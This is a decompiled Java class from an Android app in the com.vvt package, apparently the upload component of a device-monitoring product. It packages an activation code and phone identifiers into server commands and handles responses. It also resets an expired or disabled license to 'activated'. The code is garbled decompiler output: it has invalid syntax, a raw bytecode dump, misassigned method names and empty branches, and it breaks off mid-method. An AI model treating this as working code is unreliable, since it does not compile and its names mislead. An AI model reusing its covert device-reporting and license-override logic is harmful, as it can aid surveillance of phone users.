package com.vvt.datadeliverymanager;

import android.os.Looper;
import com.vvt.connectionhistorymanager.ErrorType;
import com.vvt.connectionhistorymanager.Status;
import com.vvt.datadeliverymanager.a.d;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.enums.ServerStatusType;
import com.vvt.exceptions.FxListenerNotFoundException;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.license.exception.LicenseException;
import com.vvt.phoenix.prot.command.a.s;

class m
  extends Thread
  implements com.vvt.phoenix.prot.a
{
  private m(k paramk) {}
  
  private com.vvt.phoenix.prot.b a(h paramh, com.vvt.phoenix.prot.command.c paramc)
  {
    com.vvt.phoenix.prot.b localb = new com/vvt/phoenix/prot/b;
    localb.<init>();
    com.vvt.phoenix.prot.command.b localb1 = paramh.c();
    localb.a(localb1);
    localb.a(this);
    localb.a(paramc);
    int i = paramh.e().getNumber();
    localb.a(i);
    return localb;
  }
  
  private com.vvt.phoenix.prot.command.c a(h paramh, String paramString)
  {
    int i = 1;
    Object localObject1 = k.d(this.a).a();
    String str1 = ((LicenseInfo)localObject1).getActivationCode();
    String str2 = k.f(this.a).d();
    String str3 = k.f(this.a).e();
    String str4 = k.f(this.a).f();
    String str5 = "2.25.2";
    Object localObject2 = new Object[i];
    Object localObject3 = Integer.valueOf(k.f(this.a).b());
    localObject2[0] = localObject3;
    String str6 = String.format("%s", (Object[])localObject2);
    localObject3 = new Object[i];
    int j = k.f(this.a).a();
    Object localObject4 = Integer.valueOf(j);
    localObject3[0] = localObject4;
    localObject2 = String.format("%s", (Object[])localObject3);
    int k = ((LicenseInfo)localObject1).getConfigurationId();
    int m = 5002;
    localObject4 = new com/vvt/phoenix/prot/command/c;
    ((com.vvt.phoenix.prot.command.c)localObject4).<init>();
    ((com.vvt.phoenix.prot.command.c)localObject4).b(m);
    ((com.vvt.phoenix.prot.command.c)localObject4).a(str5);
    ((com.vvt.phoenix.prot.command.c)localObject4).c(k);
    ((com.vvt.phoenix.prot.command.c)localObject4).b(str2);
    ((com.vvt.phoenix.prot.command.c)localObject4).c(str1);
    ((com.vvt.phoenix.prot.command.c)localObject4).d(i);
    ((com.vvt.phoenix.prot.command.c)localObject4).d(str4);
    ((com.vvt.phoenix.prot.command.c)localObject4).e(str6);
    ((com.vvt.phoenix.prot.command.c)localObject4).f((String)localObject2);
    ((com.vvt.phoenix.prot.command.c)localObject4).g(str3);
    ((com.vvt.phoenix.prot.command.c)localObject4).h(paramString);
    localObject1 = k.l(this.a);
    if (localObject1 != null)
    {
      localObject1 = k.l(this.a);
      k = ((com.vvt.c.c)localObject1).b();
      ((com.vvt.phoenix.prot.command.c)localObject4).g(k);
    }
    ((com.vvt.phoenix.prot.command.c)localObject4).e(0);
    ((com.vvt.phoenix.prot.command.c)localObject4).f(0);
    boolean bool = paramh.l();
    if (bool) {
      ((com.vvt.phoenix.prot.command.c)localObject4).e(i);
    }
    bool = paramh.m();
    if (bool) {
      ((com.vvt.phoenix.prot.command.c)localObject4).f(i);
    }
    return (com.vvt.phoenix.prot.command.c)localObject4;
  }
  
  /* Error */
  private void a()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: aload_0
    //   3: monitorenter
    //   4: invokestatic 154	com/vvt/datadeliverymanager/k:d	()Z
    //   7: istore_2
    //   8: iload_2
    //   9: ifeq +3 -> 12
    //   12: aload_0
    //   13: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   16: astore_3
    //   17: aload_3
    //   18: invokestatic 158	com/vvt/datadeliverymanager/k:j	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/server_address_manager/a;
    //   21: astore_3
    //   22: aload_3
    //   23: invokeinterface 162 1 0
    //   28: astore 4
    //   30: aload_0
    //   31: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   34: astore_3
    //   35: aload_3
    //   36: invokestatic 158	com/vvt/datadeliverymanager/k:j	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/server_address_manager/a;
    //   39: astore_3
    //   40: aload_3
    //   41: invokeinterface 164 1 0
    //   46: astore_3
    //   47: aload_0
    //   48: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   51: astore 5
    //   53: aload 5
    //   55: invokestatic 158	com/vvt/datadeliverymanager/k:j	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/server_address_manager/a;
    //   58: astore 5
    //   60: aload 5
    //   62: invokeinterface 166 1 0
    //   67: astore_1
    //   68: invokestatic 154	com/vvt/datadeliverymanager/k:d	()Z
    //   71: istore 6
    //   73: iload 6
    //   75: ifeq +3 -> 78
    //   78: invokestatic 154	com/vvt/datadeliverymanager/k:d	()Z
    //   81: istore 6
    //   83: iload 6
    //   85: ifeq +3 -> 88
    //   88: aload 4
    //   90: invokestatic 171	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   93: istore 6
    //   95: iload 6
    //   97: ifne +403 -> 500
    //   100: aload_3
    //   101: invokestatic 171	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   104: istore 6
    //   106: iload 6
    //   108: ifne +392 -> 500
    //   111: aload_0
    //   112: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   115: astore 5
    //   117: aload_0
    //   118: invokespecial 174	com/vvt/datadeliverymanager/m:removeFromPath	()Lcom/vvt/datadeliverymanager/AppEngine1;
    //   121: astore 7
    //   123: aload 5
    //   125: aload 7
    //   127: invokestatic 177	com/vvt/datadeliverymanager/k:removeFromPath	(Lcom/vvt/datadeliverymanager/k;Lcom/vvt/datadeliverymanager/AppEngine1;)Lcom/vvt/datadeliverymanager/AppEngine1;
    //   130: pop
    //   131: invokestatic 179	com/vvt/datadeliverymanager/k:f	()Z
    //   134: istore 6
    //   136: iload 6
    //   138: ifeq +3 -> 141
    //   141: aload_0
    //   142: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   145: astore 5
    //   147: aload 5
    //   149: invokestatic 182	com/vvt/datadeliverymanager/k:MyUncaughtExceptionHandler	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/datadeliverymanager/AppEngine1;
    //   152: astore 5
    //   154: aload 5
    //   156: ifnull +309 -> 465
    //   159: aload_0
    //   160: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   163: astore 5
    //   165: aload_0
    //   166: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   169: astore 7
    //   171: aload 7
    //   173: invokestatic 182	com/vvt/datadeliverymanager/k:MyUncaughtExceptionHandler	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/datadeliverymanager/AppEngine1;
    //   176: astore 7
    //   178: aload 7
    //   180: invokevirtual 185	com/vvt/datadeliverymanager/AppEngine1:d	()Lcom/vvt/datadeliverymanager/a/a;
    //   183: astore 7
    //   185: aload 5
    //   187: aload 7
    //   189: invokestatic 188	com/vvt/datadeliverymanager/k:a	(Lcom/vvt/datadeliverymanager/k;Lcom/vvt/datadeliverymanager/a/a;)Lcom/vvt/datadeliverymanager/a/a;
    //   192: pop
    //   193: aload_0
    //   194: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   197: astore 5
    //   199: aload 5
    //   201: invokestatic 192	com/vvt/datadeliverymanager/k:k	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/phoenix/prot/MyUncaughtExceptionHandler;
    //   204: astore 5
    //   206: aload 5
    //   208: aload 4
    //   210: invokevirtual 195	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:removeFromPath	(Ljava/lang/String;)V
    //   213: aload_0
    //   214: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   217: astore 4
    //   219: aload 4
    //   221: invokestatic 192	com/vvt/datadeliverymanager/k:k	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/phoenix/prot/MyUncaughtExceptionHandler;
    //   224: astore 4
    //   226: aload 4
    //   228: aload_3
    //   229: invokevirtual 196	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)V
    //   232: aload_0
    //   233: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   236: astore_3
    //   237: aload_3
    //   238: invokestatic 182	com/vvt/datadeliverymanager/k:MyUncaughtExceptionHandler	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/datadeliverymanager/AppEngine1;
    //   241: astore_3
    //   242: aload_3
    //   243: invokevirtual 199	com/vvt/datadeliverymanager/AppEngine1:f	()Lcom/vvt/datadeliverymanager/enums/DeliveryRequestType;
    //   246: astore_3
    //   247: invokestatic 179	com/vvt/datadeliverymanager/k:f	()Z
    //   250: istore 8
    //   252: iload 8
    //   254: ifeq +3 -> 257
    //   257: getstatic 205	com/vvt/datadeliverymanager/enums/DeliveryRequestType:REQUEST_TYPE_NEW	Lcom/vvt/datadeliverymanager/enums/DeliveryRequestType;
    //   260: astore 4
    //   262: aload_3
    //   263: aload 4
    //   265: if_acmpne +43 -> 308
    //   268: aload_0
    //   269: aload_1
    //   270: invokespecial 206	com/vvt/datadeliverymanager/m:a	(Ljava/lang/String;)V
    //   273: invokestatic 154	com/vvt/datadeliverymanager/k:d	()Z
    //   276: istore_2
    //   277: iload_2
    //   278: ifeq +3 -> 281
    //   281: aload_0
    //   282: monitorexit
    //   283: return
    //   284: astore_3
    //   285: iconst_0
    //   286: istore_2
    //   287: aconst_null
    //   288: astore_3
    //   289: iconst_0
    //   290: istore 8
    //   292: aconst_null
    //   293: astore 4
    //   295: invokestatic 208	com/vvt/datadeliverymanager/k:MyUncaughtExceptionHandler	()Z
    //   298: istore 6
    //   300: iload 6
    //   302: ifeq -234 -> 68
    //   305: goto -237 -> 68
    //   308: aload_0
    //   309: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   312: astore_3
    //   313: aload_3
    //   314: invokestatic 182	com/vvt/datadeliverymanager/k:MyUncaughtExceptionHandler	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/datadeliverymanager/AppEngine1;
    //   317: astore_3
    //   318: aload_3
    //   319: invokevirtual 211	com/vvt/datadeliverymanager/AppEngine1:FxFileObserverWorker	()J
    //   322: lstore 9
    //   324: invokestatic 179	com/vvt/datadeliverymanager/k:f	()Z
    //   327: istore_2
    //   328: iload_2
    //   329: ifeq +3 -> 332
    //   332: aload_0
    //   333: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   336: astore_3
    //   337: aload_3
    //   338: invokestatic 192	com/vvt/datadeliverymanager/k:k	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/phoenix/prot/MyUncaughtExceptionHandler;
    //   341: astore_3
    //   342: aload_3
    //   343: lload 9
    //   345: aload_0
    //   346: invokevirtual 214	com/vvt/phoenix/prot/MyUncaughtExceptionHandler:a	(JLcom/vvt/phoenix/prot/a;)J
    //   349: lstore 9
    //   351: iconst_m1
    //   352: i2l
    //   353: lstore 11
    //   355: lload 9
    //   357: lload 11
    //   359: lcmp
    //   360: istore_2
    //   361: iload_2
    //   362: ifne -89 -> 273
    //   365: invokestatic 216	com/vvt/datadeliverymanager/k:e	()Z
    //   368: istore_2
    //   369: iload_2
    //   370: ifeq +3 -> 373
    //   373: aload_0
    //   374: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   377: astore_3
    //   378: aload_3
    //   379: invokestatic 182	com/vvt/datadeliverymanager/k:MyUncaughtExceptionHandler	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/datadeliverymanager/AppEngine1;
    //   382: astore_3
    //   383: aload_3
    //   384: invokevirtual 218	com/vvt/datadeliverymanager/AppEngine1:AppEngine1	()I
    //   387: istore_2
    //   388: aload_0
    //   389: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   392: astore 4
    //   394: aload 4
    //   396: invokestatic 182	com/vvt/datadeliverymanager/k:MyUncaughtExceptionHandler	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/datadeliverymanager/AppEngine1;
    //   399: astore 4
    //   401: aload 4
    //   403: invokevirtual 221	com/vvt/datadeliverymanager/AppEngine1:i	()I
    //   406: istore 8
    //   408: iload_2
    //   409: iload 8
    //   411: if_icmpge -138 -> 273
    //   414: aload_0
    //   415: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   418: astore_3
    //   419: aload_3
    //   420: invokestatic 182	com/vvt/datadeliverymanager/k:MyUncaughtExceptionHandler	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/datadeliverymanager/AppEngine1;
    //   423: astore_3
    //   424: aload_0
    //   425: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   428: astore 4
    //   430: aload 4
    //   432: invokestatic 182	com/vvt/datadeliverymanager/k:MyUncaughtExceptionHandler	(Lcom/vvt/datadeliverymanager/k;)Lcom/vvt/datadeliverymanager/AppEngine1;
    //   435: astore 4
    //   437: aload 4
    //   439: invokevirtual 218	com/vvt/datadeliverymanager/AppEngine1:AppEngine1	()I
    //   442: iconst_1
    //   443: iadd
    //   444: istore 8
    //   446: aload_3
    //   447: iload 8
    //   449: invokevirtual 222	com/vvt/datadeliverymanager/AppEngine1:removeFromPath	(I)V
    //   452: aload_0
    //   453: aload_1
    //   454: invokespecial 206	com/vvt/datadeliverymanager/m:a	(Ljava/lang/String;)V
    //   457: goto -184 -> 273
    //   460: astore_3
    //   461: aload_0
    //   462: monitorexit
    //   463: aload_3
    //   464: athrow
    //   465: invokestatic 179	com/vvt/datadeliverymanager/k:f	()Z
    //   468: istore_2
    //   469: iload_2
    //   470: ifeq +3 -> 473
    //   473: aload_0
    //   474: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   477: astore_3
    //   478: aconst_null
    //   479: astore_1
    //   480: aload_3
    //   481: iconst_0
    //   482: invokestatic 225	com/vvt/datadeliverymanager/k:a	(Lcom/vvt/datadeliverymanager/k;Z)V
    //   485: invokestatic 231	android/os/Looper:myLooper	()Landroid/os/Looper;
    //   488: astore_3
    //   489: aload_3
    //   490: ifnull -217 -> 273
    //   493: aload_3
    //   494: invokevirtual 234	android/os/Looper:quit	()V
    //   497: goto -224 -> 273
    //   500: invokestatic 216	com/vvt/datadeliverymanager/k:e	()Z
    //   503: istore_2
    //   504: iload_2
    //   505: ifeq +3 -> 508
    //   508: aload_0
    //   509: getfield 10	com/vvt/datadeliverymanager/m:a	Lcom/vvt/datadeliverymanager/k;
    //   512: astore_3
    //   513: aconst_null
    //   514: astore_1
    //   515: aload_3
    //   516: iconst_0
    //   517: invokestatic 225	com/vvt/datadeliverymanager/k:a	(Lcom/vvt/datadeliverymanager/k;Z)V
    //   520: goto -247 -> 273
    //   523: astore_3
    //   524: iconst_0
    //   525: istore_2
    //   526: aconst_null
    //   527: astore_3
    //   528: goto -233 -> 295
    //   531: astore 5
    //   533: goto -238 -> 295
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	536	0	this	m
    //   1	514	1	str	String
    //   7	363	2	bool1	boolean
    //   387	25	2	i	int
    //   468	58	2	bool2	boolean
    //   16	247	3	localObject1	Object
    //   284	1	3	localGeneralSecurityException1	java.security.GeneralSecurityException
    //   288	159	3	localObject2	Object
    //   460	4	3	localObject3	Object
    //   477	39	3	localObject4	Object
    //   523	1	3	localGeneralSecurityException2	java.security.GeneralSecurityException
    //   527	1	3	localObject5	Object
    //   28	410	4	localObject6	Object
    //   51	156	5	localObject7	Object
    //   531	1	5	localGeneralSecurityException3	java.security.GeneralSecurityException
    //   71	230	6	bool3	boolean
    //   121	67	7	localObject8	Object
    //   250	41	8	bool4	boolean
    //   406	42	8	j	int
    //   322	34	9	l1	long
    //   353	5	11	l2	long
    // Exception table:
    //   from	to	target	type
    //   12	16	284	java/security/GeneralSecurityException
    //   17	21	284	java/security/GeneralSecurityException
    //   22	28	284	java/security/GeneralSecurityException
    //   4	7	460	finally
    //   12	16	460	finally
    //   17	21	460	finally
    //   22	28	460	finally
    //   30	34	460	finally
    //   35	39	460	finally
    //   40	46	460	finally
    //   47	51	460	finally
    //   53	58	460	finally
    //   60	67	460	finally
    //   68	71	460	finally
    //   78	81	460	finally
    //   88	93	460	finally
    //   100	104	460	finally
    //   111	115	460	finally
    //   117	121	460	finally
    //   125	131	460	finally
    //   131	134	460	finally
    //   141	145	460	finally
    //   147	152	460	finally
    //   159	163	460	finally
    //   165	169	460	finally
    //   171	176	460	finally
    //   178	183	460	finally
    //   187	193	460	finally
    //   193	197	460	finally
    //   199	204	460	finally
    //   208	213	460	finally
    //   213	217	460	finally
    //   219	224	460	finally
    //   228	232	460	finally
    //   232	236	460	finally
    //   237	241	460	finally
    //   242	246	460	finally
    //   247	250	460	finally
    //   257	260	460	finally
    //   269	273	460	finally
    //   273	276	460	finally
    //   295	298	460	finally
    //   308	312	460	finally
    //   313	317	460	finally
    //   318	322	460	finally
    //   324	327	460	finally
    //   332	336	460	finally
    //   337	341	460	finally
    //   345	349	460	finally
    //   365	368	460	finally
    //   373	377	460	finally
    //   378	382	460	finally
    //   383	387	460	finally
    //   388	392	460	finally
    //   394	399	460	finally
    //   401	406	460	finally
    //   414	418	460	finally
    //   419	423	460	finally
    //   424	428	460	finally
    //   430	435	460	finally
    //   437	442	460	finally
    //   447	452	460	finally
    //   453	457	460	finally
    //   465	468	460	finally
    //   473	477	460	finally
    //   481	485	460	finally
    //   485	488	460	finally
    //   493	497	460	finally
    //   500	503	460	finally
    //   508	512	460	finally
    //   516	520	460	finally
    //   30	34	523	java/security/GeneralSecurityException
    //   35	39	523	java/security/GeneralSecurityException
    //   40	46	523	java/security/GeneralSecurityException
    //   47	51	531	java/security/GeneralSecurityException
    //   53	58	531	java/security/GeneralSecurityException
    //   60	67	531	java/security/GeneralSecurityException
  }
  
  private void a(i parami)
  {
    boolean bool1 = k.d();
    if (bool1) {}
    Object localObject = k.c(this.a);
    if (localObject == null)
    {
      bool1 = k.e();
      if (bool1) {}
      return;
    }
    int j = k.c(this.a).h() + 1;
    localObject = k.c(this.a);
    int i = ((h)localObject).i();
    boolean bool3 = k.f();
    boolean bool2;
    long l1;
    h localh2;
    if ((!bool3) || (j < i))
    {
      bool2 = k.f();
      if (bool2) {}
      parami.a(true);
      bool2 = k.f();
      if (bool2) {}
      localObject = this.a;
      l1 = k.c(this.a).g();
      h localh1 = k.c(this.a);
      long l2 = localh1.k();
      k localk = this.a;
      k.a((k)localObject, l1, l2, localk);
      k.c(this.a).b(j);
      k.c(this.a).a(false);
      localObject = k.a(this.a);
      localh2 = k.c(this.a);
      bool2 = ((com.vvt.datadeliverymanager.b.b)localObject).b(localh2);
      if (!bool2)
      {
        bool2 = k.e();
        if (!bool2) {}
      }
      localObject = k.g(this.a);
      if (localObject != null)
      {
        localObject = k.g(this.a);
        ((com.vvt.datadeliverymanager.a.a)localObject).a(parami);
      }
    }
    for (;;)
    {
      bool2 = k.d();
      if (!bool2) {
        break;
      }
      break;
      bool2 = k.f();
      if (bool2) {}
      parami.a(false);
      localObject = k.k(this.a);
      localh2 = k.c(this.a);
      l1 = localh2.g();
      ((com.vvt.phoenix.prot.c)localObject).a(l1);
      bool2 = k.f();
      if (bool2) {}
      bool2 = k.f();
      if (bool2) {}
      localObject = k.a(this.a);
      localh2 = k.c(this.a);
      l1 = localh2.g();
      ((com.vvt.datadeliverymanager.b.b)localObject).a(l1);
      localObject = k.g(this.a);
      if (localObject != null)
      {
        localObject = k.g(this.a);
        ((com.vvt.datadeliverymanager.a.a)localObject).b(parami);
      }
    }
  }
  
  private void a(String paramString)
  {
    Object localObject1 = k.c(this.a);
    localObject1 = a((h)localObject1, paramString);
    Object localObject2 = k.c(this.a);
    localObject1 = a((h)localObject2, (com.vvt.phoenix.prot.command.c)localObject1);
    boolean bool1 = k.d();
    if (bool1) {}
    localObject2 = k.k(this.a);
    long l1 = ((com.vvt.phoenix.prot.c)localObject2).a((com.vvt.phoenix.prot.b)localObject1);
    k.c(this.a).a(l1);
    Object localObject3 = k.c(this.a);
    boolean bool2 = false;
    ((h)localObject3).a(false);
    localObject3 = k.c(this.a);
    Object localObject4 = DeliveryRequestType.REQUEST_TYPE_PERSISTED;
    ((h)localObject3).a((DeliveryRequestType)localObject4);
    localObject3 = k.a(this.a);
    localObject4 = k.c(this.a);
    boolean bool3 = ((com.vvt.datadeliverymanager.b.b)localObject3).b((h)localObject4);
    if (!bool3)
    {
      bool2 = k.e();
      if (bool2) {}
      k.k(this.a).a(l1);
      localObject4 = new java/lang/Exception;
      String str = "CSM request failed.";
      ((Exception)localObject4).<init>(str);
      b(l1, (Exception)localObject4);
    }
    bool2 = k.f();
    if ((!bool2) || (bool3))
    {
      long l2 = -1;
      bool3 = l1 < l2;
      if (!bool3)
      {
        bool3 = k.e();
        if (bool3) {}
        localObject3 = new java/lang/Exception;
        localObject4 = "CSM request failed.";
        ((Exception)localObject3).<init>((String)localObject4);
        b(l1, (Exception)localObject3);
      }
    }
  }
  
  private h b()
  {
    boolean bool1 = false;
    boolean bool2 = k.d();
    if (bool2) {}
    Object localObject1 = k.b(this.a);
    Object localObject3;
    if (localObject1 != null)
    {
      localObject1 = k.b(this.a);
      localObject3 = this.a;
      k.a((k)localObject3, null);
    }
    for (;;)
    {
      bool1 = k.d();
      if (bool1) {}
      return (h)localObject1;
      try
      {
        bool2 = k.d();
        if (bool2) {}
        localObject1 = this.a;
        localObject1 = k.a((k)localObject1);
        localObject1 = ((com.vvt.datadeliverymanager.b.b)localObject1).b();
      }
      catch (FxListenerNotFoundException localFxListenerNotFoundException)
      {
        boolean bool3 = k.c();
        if (bool3) {}
        localObject3 = k.a(this.a);
        long l = localFxListenerNotFoundException.getCSID();
        ((com.vvt.datadeliverymanager.b.b)localObject3).a(l);
        b();
        bool2 = false;
        Object localObject2 = null;
      }
    }
  }
  
  public void a(long paramLong, Exception paramException)
  {
    boolean bool1 = true;
    boolean bool2 = k.c();
    if (bool2) {}
    bool2 = k.c();
    if (bool2) {}
    Object localObject1 = k.c(this.a);
    if (localObject1 == null)
    {
      bool2 = k.e();
      if (bool2) {}
      return;
    }
    localObject1 = this.a;
    int j = k.c(this.a).c().a();
    Object localObject2 = Status.FAILED;
    Object localObject3 = ErrorType.HTTP;
    String str = "On construct error. Make sure your Internet connection is active";
    int k = -1;
    k.a((k)localObject1, j, (Status)localObject2, (ErrorType)localObject3, str, k);
    k.b(this.a, bool1);
    i locali = new com/vvt/datadeliverymanager/i;
    locali.<init>();
    locali.a(null);
    localObject1 = k.c(this.a).j();
    locali.a((DataProviderType)localObject1);
    localObject1 = ErrorResponseType.ERROR_PAYLOAD;
    locali.a((ErrorResponseType)localObject1);
    int i = 312;
    locali.a(i);
    localObject2 = "Key Exchange Error (-350). %s";
    localObject3 = new Object[bool1];
    label194:
    boolean bool3;
    if (paramException != null)
    {
      localObject1 = paramException.toString();
      localObject3[0] = localObject1;
      localObject1 = String.format((String)localObject2, (Object[])localObject3);
      locali.a((String)localObject1);
      locali.b(false);
      locali.a(false);
      i = k.c(this.a).a();
      locali.b(i);
      k.a(this.a).a(paramLong);
      localObject1 = k.g(this.a);
      if (localObject1 == null) {
        break label337;
      }
      bool3 = k.f();
      if (bool3) {}
      localObject1 = k.g(this.a);
      ((com.vvt.datadeliverymanager.a.a)localObject1).b(locali);
    }
    for (;;)
    {
      localObject1 = this.a;
      k.b((k)localObject1, false);
      bool3 = k.d();
      if (bool3) {}
      a();
      break;
      localObject1 = "";
      break label194;
      label337:
      bool3 = k.f();
      if (!bool3) {}
    }
  }
  
  public void a(s params)
  {
    boolean bool1 = true;
    bool2 = k.d();
    if (bool2) {}
    bool2 = k.f();
    if (bool2) {}
    Object localObject1 = k.c(this.a);
    if (localObject1 == null)
    {
      bool2 = k.e();
      if (!bool2) {}
    }
    for (;;)
    {
      return;
      k.b(this.a, bool1);
      localObject1 = k.d(this.a).a().getLicenseStatus();
      Object localObject2 = LicenseStatus.EXPIRED;
      if (localObject1 != localObject2)
      {
        localObject2 = LicenseStatus.DISABLED;
        if (localObject1 != localObject2) {}
      }
      else
      {
        bool2 = k.d();
        if (bool2) {}
        localObject1 = k.d(this.a).a();
        localObject2 = LicenseStatus.ACTIVATED;
        ((LicenseInfo)localObject1).setLicenseStatus((LicenseStatus)localObject2);
      }
      try
      {
        localObject2 = this.a;
        localObject2 = k.d((k)localObject2);
        localObject3 = this.a;
        localObject3 = k.e((k)localObject3);
        localObject4 = this.a;
        localObject4 = k.f((k)localObject4);
        localObject4 = ((com.vvt.phoneinfo.a)localObject4).d();
        boolean bool3 = true;
        ((com.vvt.license.a)localObject2).a((LicenseInfo)localObject1, (com.vvt.productinfo.a)localObject3, (String)localObject4, bool3);
      }
      catch (LicenseException localLicenseException)
      {
        for (;;)
        {
          Object localObject3;
          Object localObject4;
          long l;
          int j;
          boolean bool4;
          int k;
          String str;
          int i;
          bool2 = k.c();
          if (bool2)
          {
            continue;
            bool2 = k.f();
            if (!bool2) {}
          }
        }
      }
      localObject1 = k.a(this.a);
      l = k.c(this.a).g();
      ((com.vvt.datadeliverymanager.b.b)localObject1).a(l);
      localObject1 = new com/vvt/datadeliverymanager/i;
      ((i)localObject1).<init>();
      ((i)localObject1).a(params);
      localObject2 = k.c(this.a).j();
      ((i)localObject1).a((DataProviderType)localObject2);
      ((i)localObject1).a(null);
      j = params.e();
      ((i)localObject1).a(j);
      localObject2 = params.f();
      ((i)localObject1).a((String)localObject2);
      ((i)localObject1).b(bool1);
      ((i)localObject1).a(false);
      j = k.c(this.a).a();
      ((i)localObject1).b(j);
      localObject2 = k.g(this.a);
      if (localObject2 == null) {
        break;
      }
      bool4 = k.f();
      if (bool4) {}
      localObject2 = k.g(this.a);
      ((com.vvt.datadeliverymanager.a.a)localObject2).b((i)localObject1);
      localObject1 = new java/lang/Thread;
      localObject2 = new com/vvt/datadeliverymanager/n;
      ((n)localObject2).<init>(this, params);
      ((Thread)localObject1).<init>((Runnable)localObject2, "PCCResponseProcessingT");
      ((Thread)localObject1).start();
      localObject1 = this.a;
      localObject2 = k.c(this.a).c();
      k = ((com.vvt.phoenix.prot.command.b)localObject2).a();
      localObject3 = Status.SUCCESS;
      localObject4 = ErrorType.NONE;
      str = params.f();
      i = params.e();
      k.a((k)localObject1, k, (Status)localObject3, (ErrorType)localObject4, str, i);
      localObject1 = this.a;
      k.b((k)localObject1, false);
      bool2 = k.d();
      if (bool2) {}
      a();
    }
  }
  
  public void b(long paramLong, Exception paramException)
  {
    boolean bool1 = true;
    boolean bool2 = k.c();
    if (bool2) {}
    bool2 = k.c();
    if (bool2) {}
    Object localObject1 = k.c(this.a);
    if (localObject1 == null)
    {
      bool2 = k.e();
      if (bool2) {}
      return;
    }
    localObject1 = this.a;
    int j = k.c(this.a).c().a();
    Object localObject2 = Status.FAILED;
    Object localObject3 = ErrorType.HTTP;
    String str = "On construct error. Make sure your Internet connection is active";
    int k = -1;
    k.a((k)localObject1, j, (Status)localObject2, (ErrorType)localObject3, str, k);
    k.b(this.a, bool1);
    i locali = new com/vvt/datadeliverymanager/i;
    locali.<init>();
    locali.a(null);
    localObject1 = k.c(this.a).j();
    locali.a((DataProviderType)localObject1);
    localObject1 = ErrorResponseType.ERROR_PAYLOAD;
    locali.a((ErrorResponseType)localObject1);
    int i = 312;
    locali.a(i);
    localObject2 = "Payload Creation Error (-351). %s.";
    localObject3 = new Object[bool1];
    label194:
    boolean bool3;
    if (paramException != null)
    {
      localObject1 = paramException.toString();
      localObject3[0] = localObject1;
      localObject1 = String.format((String)localObject2, (Object[])localObject3);
      locali.a((String)localObject1);
      locali.b(false);
      locali.a(false);
      i = k.c(this.a).a();
      locali.b(i);
      k.a(this.a).a(paramLong);
      localObject1 = k.g(this.a);
      if (localObject1 == null) {
        break label337;
      }
      bool3 = k.f();
      if (bool3) {}
      localObject1 = k.g(this.a);
      ((com.vvt.datadeliverymanager.a.a)localObject1).b(locali);
    }
    for (;;)
    {
      localObject1 = this.a;
      k.b((k)localObject1, false);
      bool3 = k.d();
      if (bool3) {}
      a();
      break;
      localObject1 = "";
      break label194;
      label337:
      bool3 = k.f();
      if (!bool3) {}
    }
  }
  
  public void b(s params)
  {
    boolean bool1 = true;
    boolean bool2 = k.c();
    if (bool2) {}
    Object localObject1 = k.c(this.a);
    if (localObject1 == null)
    {
      bool2 = k.c();
      if (bool2) {}
      return;
    }
    k.b(this.a, bool1);
    localObject1 = new java/lang/Thread;
    Object localObject2 = new com/vvt/datadeliverymanager/o;
    ((o)localObject2).<init>(this, params);
    Object localObject3 = "PCCResponseProcessingT";
    ((Thread)localObject1).<init>((Runnable)localObject2, (String)localObject3);
    ((Thread)localObject1).start();
    int i = params.e();
    boolean bool3 = k.c();
    if (bool3) {}
    bool3 = k.c();
    if (bool3) {}
    localObject2 = new com/vvt/datadeliverymanager/i;
    ((i)localObject2).<init>();
    ((i)localObject2).a(params);
    localObject3 = k.c(this.a).j();
    ((i)localObject2).a((DataProviderType)localObject3);
    localObject3 = ErrorResponseType.ERROR_SERVER;
    ((i)localObject2).a((ErrorResponseType)localObject3);
